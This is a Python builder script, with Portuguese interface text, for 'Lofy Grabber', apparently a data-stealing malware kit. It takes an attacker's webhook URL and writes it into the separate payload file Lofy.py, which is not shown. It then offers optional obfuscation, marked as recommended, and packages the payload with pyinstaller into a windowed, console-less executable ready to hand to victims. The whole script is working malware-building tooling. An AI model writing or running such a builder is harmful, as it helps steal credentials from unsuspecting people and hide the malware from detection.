from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

    ██╗      ██████╗ ███████╗██╗   ██╗    ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗
    ██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ██║     ██║   ██║█████╗   ╚████╔╝     ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝ 
    ██║     ██║   ██║██╔══╝    ╚██╔╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
    ███████╗╚██████╔╝██║        ██║       ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
    ╚══════╝ ╚═════╝ ╚═╝        ╚═╝        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                        
                > Pressione Enter                                       

"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTRED_EX}

    ██╗      ██████╗ ███████╗██╗   ██╗    ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗
    ██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ██║     ██║   ██║█████╗   ╚████╔╝     ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝ 
    ██║     ██║   ██║██╔══╝    ╚██╔╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
    ███████╗╚██████╔╝██║        ██║       ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
    ╚══════╝ ╚═════╝ ╚═╝        ╚═╝        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝

            Bem vindo ao Lofy Grabber

""")

time.sleep(1)


while True:
    
    Write.Print("\nQual opção você quer escolher: ", Colors.red_to_yellow)
    Write.Print("\n1.    Criar seu Grabber", Colors.red_to_yellow)
    Write.Print("\n2.    Fechar", Colors.red_to_yellow)
    Write.Print("\nFaça sua seleção: ", Colors.red_to_yellow, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nDigite sua Webhook: " + Style.RESET_ALL)

        filename = "Lofy.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} arquivo atualizado.", Colors.red_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nVocê quer criptografar seu código (Recomendado) (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} O arquivo foi criptografado.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nVocê digitou algo errado. Por favor, tente novamente.", Colors.red_to_purple)

        while True:
            answer = input(Fore.CYAN + "\nVocê quer fazer arquivo exe? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} O arquivo foi convertido para exe.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nVocê digitou errado. Por favor, tente novamente.", Colors.red_to_purple)

    elif choice == "2":
        Write.Print("\nSaindo do programa...", Colors.red_to_yellow)
        break

    else:
        Write.Print("\nVocê digitou algo errado. Por favor, tente novamente", Colors.red_to_purple)
